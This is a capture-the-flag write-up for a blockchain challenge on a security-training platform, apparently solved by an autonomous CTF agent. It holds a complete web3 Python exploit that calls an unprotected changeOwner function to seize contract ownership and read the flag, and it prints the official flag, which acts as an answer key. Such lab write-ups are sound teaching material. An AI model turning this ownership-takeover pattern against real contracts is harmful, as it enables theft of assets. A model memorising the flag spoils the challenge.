# Writeup: Access_Control

## Header & Metadata
- **Challenge:** Access_Control (ID: 723)
- **CTF Event / Platform:** CyLab Security Academy
- **Category:** Blockchain
- **Server / Instance:** `N/A`
- **Attached Files:** AccessControl.sol
- **Official Flag:** `academy{i_c4n_b3_0wn3r_7a45d669}`

---

## Mô tả bài toán (Overview / Analysis)
We've created a simple contract to store a secret flag. But you currently are not the owner of the contract... Only the owner of the contract should be able to access it. We're sure we've made it secure this time. 
Contract: <a href='https://challenge-files.cylabacademy.net/library/4ace2f9c4b176be6fd783cffab3351b8de943d802146d3d77adaa487d93ed78a/AccessControl.sol' download>here</a>

### Hints
- Wait, maybe you can be the owner?

---

## Chi tiết kỹ thuật (Technical Deep-Dive)
Solved autonomously by Antigravity CTF Agent.

---

## Mã nguồn khai thác (Solve Script / Exploit)
```python
#!/usr/bin/env python3
"""
Solve script for Access_Control (#723)
Category: Blockchain
"""
import sys
import time
import re
import urllib.request
from pathlib import Path
from web3 import Web3

# Add root folder to import CyLabClient if needed
for p in Path(__file__).resolve().parents:
    if (p / "cylab_tool.py").exists():
        sys.path.append(str(p))
        break
try:
    from cylab_tool import CyLabClient
except ImportError:
    CyLabClient = None

ABI = [
    {
        "inputs": [{"name": "_newOwner", "type": "address"}],
        "name": "changeOwner",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "solve",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "getFlag",
        "outputs": [{"name": "", "type": "string"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "owner",
        "outputs": [{"name": "", "type": "address"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "revealed",
        "outputs": [{"name": "", "type": "bool"}],
        "stateMutability": "view",
        "type": "function"
    }
]

def get_live_target():
    if CyLabClient:
        try:
            client = CyLabClient()
            client.load_session()
            info = client.get_challenge_instance_info(723)
            if info.get("status") != "RUNNING":
                print("[*] Deploying fresh instance...")
                client.deploy_instance(723)
                for _ in range(30):
                    time.sleep(2)
                    info = client.get_challenge_instance_info(723)
                    if info.get("status") == "RUNNING":
                        break
            desc = info.get("description", "")
            rpc_m = re.search(r"Eth node address:\s*([a-zA-Z0-9\.\-]+):(\d+)", desc)
            web_m = re.search(r"href=['\"](https?://[a-zA-Z0-9\.\-]+:\d+/?)['\"]", desc)
            if rpc_m and web_m:
                rpc_url = f"http://{rpc_m.group(1)}:{rpc_m.group(2)}"
                web_url = web_m.group(1).rstrip("/")
                return rpc_url, web_url
        except Exception as e:
            print(f"[!] CyLabClient error: {e}")
            
    # Fallback default from recent deploy
    return "http://chatelaine.cylabacademy.net:36753", "http://chatelaine.cylabacademy.net:19644"

def solve():
    print("[*] Solving Access_Control...")
    rpc_url, web_url = get_live_target()
    print(f"[+] RPC URL: {rpc_url}")
    print(f"[+] Web URL: {web_url}")

    # Wait for node and web server to become ready
    print("[*] Waiting for services to become responsive...")
    for i in range(30):
        try:
            resp = urllib.request.urlopen(f"{web_url}/", timeout=3)
            if resp.status == 200:
                print(f"[+] Web server ready (attempt {i+1})")
                break
        except Exception:
            time.sleep(3)
    else:
        raise RuntimeError("Web server did not become responsive.")

    html = urllib.request.urlopen(f"{web_url}/").read().decode("utf-8")
    with open("page.html", "w", encoding="utf-8") as f:
        f.write(html)

    contract_addr = Web3.to_checksum_address(re.search(r'id=["\']contract-address["\']>([^<]+)</code>', html).group(1).strip())
    player_priv = re.search(r'id=["\']player-priv["\']>([^<]+)</code>', html).group(1).strip()
    player_addr = Web3.to_checksum_address(re.search(r'id=["\']player-address["\']>([^<]+)</code>', html).group(1).strip())

    print(f"[*] Contract: {contract_addr}")
    print(f"[*] Player:   {player_addr}")

    w3 = Web3(Web3.HTTPProvider(rpc_url))
    for i in range(20):
        if w3.is_connected():
            print(f"[+] Connected to RPC. Block: {w3.eth.block_number}")
            break
        time.sleep(2)
    else:
        raise RuntimeError("Could not connect to RPC node.")

    contract = w3.eth.contract(address=contract_addr, abi=ABI)
    print(f"[*] Initial Owner:    {contract.functions.owner().call()}")
    print(f"[*] Initial Revealed: {contract.functions.revealed().call()}")

    # Step 1: Claim ownership via changeOwner(player_addr)
    print("[*] Sending changeOwner transaction...")
    nonce = w3.eth.get_transaction_count(player_addr)
    tx1 = contract.functions.changeOwner(player_addr).build_transaction({
        "from": player_addr,
        "nonce": nonce,
        "gas": 150000,
        "gasPrice": w3.eth.gas_price
    })
    signed_tx1 = w3.eth.account.sign_transaction(tx1, player_priv)
    tx1_hash = w3.eth.send_raw_transaction(signed_tx1.raw_transaction)
    print(f"[+] changeOwner tx sent: {tx1_hash.hex()}")
    receipt1 = w3.eth.wait_for_transaction_receipt(tx1_hash)
    print(f"[+] Status: {receipt1.status}, Owner is now: {contract.functions.owner().call()}")

    # Step 2: Trigger solve()
    print("[*] Sending solve transaction...")
    nonce = w3.eth.get_transaction_count(player_addr)
    tx2 = contract.functions.solve().build_transaction({
        "from": player_addr,
        "nonce": nonce,
        "gas": 150000,
        "gasPrice": w3.eth.gas_price
    })
    signed_tx2 = w3.eth.account.sign_transaction(tx2, player_priv)
    tx2_hash = w3.eth.send_raw_transaction(signed_tx2.raw_transaction)
    print(f"[+] solve tx sent: {tx2_hash.hex()}")
    receipt2 = w3.eth.wait_for_transaction_receipt(tx2_hash)
    print(f"[+] Status: {receipt2.status}, Revealed: {contract.functions.revealed().call()}")

    # Step 3: Retrieve Flag
    flag = contract.functions.getFlag().call()
    print(f"[!] FLAG FOUND: {flag}")

    with open("flag.txt", "w", encoding="utf-8") as f:
        f.write(flag + "\n")

    return flag

if __name__ == "__main__":
    solve()

```

---

## Log thực thi & Flag (Output & Verification)
```text
[+] Flag verified and saved to flag.txt:
academy{i_c4n_b3_0wn3r_7a45d669}
```
